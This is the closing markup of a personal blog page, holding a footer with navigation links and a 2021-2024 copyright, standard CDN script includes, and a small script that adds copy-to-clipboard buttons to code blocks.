        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2024
    塔菲
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
